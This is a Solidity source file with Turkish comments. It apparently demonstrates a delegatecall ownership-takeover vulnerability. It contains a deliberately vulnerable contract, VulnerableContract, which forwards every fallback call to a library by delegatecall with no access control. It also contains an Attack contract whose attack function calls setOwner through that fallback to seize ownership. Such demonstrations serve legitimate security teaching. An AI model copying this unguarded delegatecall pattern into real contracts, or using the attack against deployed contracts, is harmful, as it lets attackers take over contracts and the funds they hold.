// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// Lib kontratı: Owner adresini değiştirme işlevi sağlar.
contract Lib {
    address public owner;

    // Yeni bir owner adresi belirlemek için fonksiyon
    function setOwner(address _newOwner) public {
        owner = _newOwner; // Owner adresini güncelle
    }
}


// VulnerableContract kontratı: Bu kontrat, dışarıdan gelen delegatecall'ları yönlendirir.
contract VulnerableContract {
    address public owner;
    address public lib; // Lib kontratının adresi

    // Yapıcı fonksiyon: Lib kontratının adresini ve owner'ı ayarlamak için kullanılır.
    constructor(address _libAddress) {
        lib = _libAddress; 
        owner = msg.sender; // Owner'ı kontratı dağıtan kişi olarak ayarla
    }

    // Ether alımı için receive fonksiyonu
    receive() external payable {}

    // Fallback fonksiyonu: Gelen çağrıları lib kontratına delegatecall ile yönlendirir.
    fallback() external payable {
        // Lib kontratına delegatecall yaparak gelen veri ile işlem yapılır
        (bool success, ) = lib.delegatecall(msg.data);
        // Eğer delegatecall başarılı olmazsa işlem geri alınır.
        require(success, "Delegatecall failed");
    }
}


// Attack kontratı: VulnerableContract kontratını saldırıya uğratmak için kullanılır.
contract Attack {
    address public owner;

    // VulnerableContract'a saldırı yapmak için kullanılan fonksiyon
    function attack(address vulnerableAddress) public {
        // VulnerableContract üzerindeki fallback fonksiyonunu tetiklemek için düşük seviyeli çağrı
        (bool success, ) = vulnerableAddress.call(abi.encodeWithSignature("setOwner(address)", msg.sender));
        require(success, "Attack failed"); // Eğer çağrı başarısız olursa işlem geri alınır.
    }

    // Saldırgan adresini owner olarak belirleyen fonksiyon
    function setOwner(address _attacker) public {
        owner = _attacker; // Owner adresini saldırgan olarak ayarla
    }
}
